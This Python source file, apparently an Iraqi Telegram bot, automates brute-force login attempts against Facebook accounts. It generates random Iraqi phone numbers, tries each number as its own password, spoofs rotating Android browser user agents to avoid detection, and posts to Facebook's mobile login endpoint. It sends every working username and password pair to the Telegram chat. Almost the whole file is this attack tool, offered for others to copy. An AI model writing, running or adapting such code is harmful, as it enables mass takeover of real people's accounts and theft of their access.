import requests,random,sys,telebot
from telebot import types

L7Ngen=[]
pwpluss,pwnya=[],[]
# انضر لها وكأنها قمر يدور امامي فتأخذ قلبي وتكسره 
tok = input( ' Token : ')
bot = telebot.TeleBot("tok")
L7N1 = types.InlineKeyboardButton(text ="Click To Start ⚡",callback_data = "L7N1")
L7N_2 = types.InlineKeyboardButton(text ="Programmer",url="t.me/g_4_q")

@bot.message_handler(commands=["start"])
def start(message):
	photo = f"t.me/{message.from_user.username}"
	tag = f"[{message.from_user.first_name}]({photo})"
	text = f"*Hello* {tag}* To Bot Check Acc Facebook 🐉 !*"
	L7Nbut1 = types.InlineKeyboardMarkup()
	L7Nbut1.add(L7N1)
	L7Nbut1.add(L7N_2)
	bot.send_photo(message.chat.id,photo,text ,
 parse_mode="Markdown",reply_markup=L7Nbut1)
@bot.callback_query_handler(lambda call:True)
def call(call): 
		if call.data == "L7N1":
			messag=bot.send_message(chat_id=call.message.chat.id,text=' *Send Your Name bro :*',parse_mode='Markdown')
			
			bot.register_next_step_handler(messag,L7N_check_acc_face,messag.id)
			for i in range(3131313131313):
				rr = random.randint
				andro=random.choice(['3.0','4.4.2','4.4.4','5.0.1','8.0','7.0','6.0','5.0','4.0','4.3.4','7.0.1','8.0.1','3','4','5','6','7','8','9','10','11','12','13'])
				rmx=random.choice(['Redmi 7','Redmi Note 8','Redmi 6A','Mi 9 Lite','Redmi Note 11 Pro','Redmi 5A','Mi 9 SE','POCO M4 Pro','POCO X3 Pro','Redmi 5 Plus','Redmi Note 10 Pro','M2007J22G','Redmi 9C NFC'])
				build=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
				vbuild=random.choice(['001','002','003','004','005','006','007','008','009','010','011','012','013','014','015','016','017','018','019','020'])
				mark=random.choice(['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr'])
				aa_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				bb_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				cc_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {mark}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				dd_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {mark}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				ee_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				ff_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				gg_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {mark}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				hh_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {mark}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				ii_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				jj_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				kk_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {mark}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				ll_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {mark}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				mm_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				nn_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				oo_L7N=f'Mozilla/5.0 (Linux; Android {andro}; {mark}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				pp_L7N=f'Mozilla/5.0 (Linux; U; Android {andro}; {mark}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
				L7Nconct = random.choice([aa_L7N,bb_L7N,cc_L7N,dd_L7N,ee_L7N,ff_L7N,gg_L7N,hh_L7N,ii_L7N,jj_L7N,kk_L7N,ll_L7N,mm_L7N,nn_L7N,oo_L7N,pp_L7N])
				L7Ngen.append(L7Nconct)

def L7N_check_acc_face(message,id):
    OK =0
    CP =0
    while True:
    	Num = random.choice(["0770","0784","0771","0771","0772","0775","0750","0773","0774","0782"])
    	user='1234567890'
    	Ber=''.join(random.choice(user) for i in range(7))
    	psss = Num+Ber
    	ua = random.choice(L7Ngen)
    	
    	emm = '+964'+Num+Ber
    	session = requests.Session()
    	free_fb = session.get('https://m.facebook.com').text
    	if psss:
    	   sys.stdout.flush()
    	   cookies = {
    'datr': '78IiZZgbq4z_BjU1zGHDVX_v',
    'sb': '78IiZQJaq18WMup1lNZl0EAp',
}
    	   headers = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'datr=78IiZZgbq4z_BjU1zGHDVX_v; sb=78IiZQJaq18WMup1lNZl0EAp',
    'dpr': '2',
    'origin': 'https://mbasic.facebook.com',
    'referer': 'https://mbasic.facebook.com/login/?email=baqer&li=78IiZbl8PfbvMwTLYeujKZV-&e=1348131&shbl=1&wtsid=rdr_0Ra1Rt31sdNp4Fkfg&refsrc=deprecated&_rdr',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"RMX2040"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}

    	   params = {
    'shbl': '1',
    'refsrc': 'deprecated',
}

    	   data = {
    'lsd': 'AVq-9WSQ2Do',
    'jazoest': '2846',
    'm_ts': '1696776964',
    'li': '78IiZbl8PfbvMwTLYeujKZV-',
    'try_number': '0',
    'unrecognized_tries': '0',
    'email': emm,
    'pass': psss,
    'login': 'تسجيل الدخول',
    'bi_xrwh': '0',
}

    	   L7Nres = session.post(
    'https://mbasic.facebook.com/login/device-based/regular/login/',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
).text
    	   if 'fb_dtsg' in L7Nres:
    	       OK+=1
    	       bot.send_message(message.chat.id,text=f'''
⋘─────━𓆩𝐋7𝐍𓆪‏━─────⋙
❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {emm}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {psss}
<><><><><><><><><><><><><><>
⋘─────━𓆩𝐋7𝐍𓆪‏━─────⋙
@g_4_q  -  @ToPython
    	           	       ''')
    	   else:
    	   	CP+=1
    	   	
    	   	OK_CP_Check_L7N=types.InlineKeyboardButton(text=f"{emm} : {psss}", callback_data="L7NL7N")
    	   	OK1 =types.InlineKeyboardButton(text=f"OK : {OK}", callback_data="L7NL7N")
    	   	CP1 =types.InlineKeyboardButton(text=f"CP : {CP}", callback_data="L7NL7N")
    	   	L7Nurl =types.InlineKeyboardButton(text="Programmer 🥇 ", url="t.me/g_4_q")
    	   	L7Nbut2 = types.InlineKeyboardMarkup(row_width=3)
    	   	L7Nbut2 = types.InlineKeyboardMarkup()
    	   	L7Nbut2.add(OK_CP_Check_L7N)
    	   	L7Nbut2.add(OK1)
    	   	L7Nbut2.add(CP1)
    	   	L7Nbut2.add(L7Nurl)
    	   	bot.edit_message_text(chat_id=message.chat.id,message_id=id,text="""
*Checking in Progress, Good Luck.. ! *
By : [𝐋7𝐍 «𓆩ᶠᴮᴵ𓆪» ™](t.me/g_4_q) 🐉
""",parse_mode="markdown",disable_web_page_preview = 'true',reply_markup=L7Nbut2)

# اخمط وغير حقوق بس اذكر مصدري ماانشرك + تخمط تبين لان اول بوت فيس هذا لا تصير لوتي 🐉
#L7N 
bot.infinity_polling()	
